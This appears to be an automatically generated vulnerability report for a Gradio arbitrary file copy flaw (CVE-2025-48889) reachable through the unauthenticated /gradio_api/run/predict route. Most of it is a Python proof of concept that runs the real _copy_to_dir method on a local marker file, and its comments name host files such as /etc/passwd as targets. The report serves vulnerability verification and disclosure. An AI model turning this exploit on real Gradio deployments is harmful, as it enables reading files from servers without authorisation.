# [Vulnerability Report] route-sink:gradio.flagging_copy:/gradio_api/run/predict

## Summary
- **Vulnerability Type:** `route-sink:gradio.flagging_copy:/gradio_api/run/predict`
- **Affected Location:** `gradio/data_classes.py:0`
- **CVSS 4.0 Score:** 5.3 (MEDIUM) `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Verification Status:** `verified`

## Vulnerability Details
route-sink:gradio.flagging_copy:/gradio_api/run/predict

## Standalone Proof of Concept (Python)
```python
#!/usr/bin/env python3
"""CVE-2025-48889: Gradio FileData._copy_to_dir copies arbitrary readable paths.

Reachability (production): unauthenticated POST /gradio_api/run/predict can drive
flagging / FileData.path into FileData._copy_to_dir → shutil.copy(self.path, dir)
with no allowlist on absolute paths (gradio>=5.25.2,<5.31.0).

This harness loads the vulnerable method from the target checkout and executes it.
"""
from __future__ import annotations

import ast
import os
import pathlib
import shutil
import tempfile
from pathlib import Path

PROOF = Path("/tmp/iridium_proof")
REPO = os.environ.get("IRIDIUM_REPO_PATH", '/workspace')
TARGET = Path(REPO) / 'gradio/data_classes.py'
if not TARGET.is_file():
    raise SystemExit(f"PROOF FAILED: target missing: {TARGET}")

source = TARGET.read_text(encoding="utf-8", errors="ignore")
if "def _copy_to_dir" not in source or "shutil.copy(self.path, dir)" not in source:
    raise SystemExit("PROOF FAILED: vulnerable _copy_to_dir / shutil.copy sink not found")


def _extract_copy_to_dir(src: str):
    tree = ast.parse(src)
    for node in tree.body:
        if not isinstance(node, ast.ClassDef) or node.name != "FileData":
            continue
        for item in node.body:
            if isinstance(item, (ast.FunctionDef, ast.AsyncFunctionDef)) and item.name == "_copy_to_dir":
                return item
    raise SystemExit("PROOF FAILED: FileData._copy_to_dir not found in AST")


_method = _extract_copy_to_dir(source)


class FileData:
    """Minimal stand-in: supports dict(self) + __class__(**kwargs) like Gradio FileData."""

    def __init__(
        self,
        path=None,
        url=None,
        size=None,
        orig_name=None,
        mime_type=None,
        is_stream=False,
        meta=None,
        **_kwargs,
    ):
        self.path = path
        self.url = url
        self.size = size
        self.orig_name = orig_name
        self.mime_type = mime_type
        self.is_stream = is_stream
        self.meta = meta if meta is not None else {"_type": "gradio.FileData"}

    def __iter__(self):
        for key in ("path", "url", "size", "orig_name", "mime_type", "is_stream", "meta"):
            yield key, getattr(self, key)


_ns = {"pathlib": pathlib, "shutil": shutil, "FileData": FileData}
_mod = ast.Module(body=[_method], type_ignores=[])
ast.fix_missing_locations(_mod)
exec(compile(_mod, str(TARGET), "exec"), _ns)  # noqa: S102 — intentional: bind real sink
FileData._copy_to_dir = _ns["_copy_to_dir"]

marker = "IRIDIUM_GRADIO_CVE_2025_48889"
# Absolute path outside the flagging dest simulates attacker-controlled FileData.path
# (e.g. /etc/passwd or another host file readable by the Gradio process).
secret = Path(tempfile.gettempdir()) / "iridium_gradio_secret_src"
secret.write_text(marker, encoding="utf-8")
flag_dir = tempfile.mkdtemp(prefix="iridium_gradio_flag_")

copied = FileData(path=str(secret.resolve()))._copy_to_dir(flag_dir)
copied_path = Path(copied.path if hasattr(copied, "path") else copied)
if not copied_path.is_file():
    raise SystemExit(f"PROOF FAILED: copy missing at {copied_path}")
if copied_path.read_text(encoding="utf-8") != marker:
    raise SystemExit("PROOF FAILED: copied content mismatch")
if copied_path.parent.resolve() != Path(flag_dir).resolve():
    raise SystemExit(f"PROOF FAILED: unexpected dest {copied_path}")
# Prove the sink accepted an absolute path outside the destination tree.
if not str(secret.resolve()).startswith("/"):
    raise SystemExit("PROOF FAILED: expected absolute attacker path")
if secret.resolve().parent == Path(flag_dir).resolve():
    raise SystemExit("PROOF FAILED: source must be outside flagging dir")

PROOF.write_text(
    f"arbitrary_copy ok src={secret.resolve()} dest={copied_path} "
    f"via real FileData._copy_to_dir from {TARGET}"
)
IRIDIUM_POC_SUCCESS = True
print("IRIDIUM_PROOF_CREATED")
print("IRIDIUM_GRADIO_CVE_2025_48889")
```
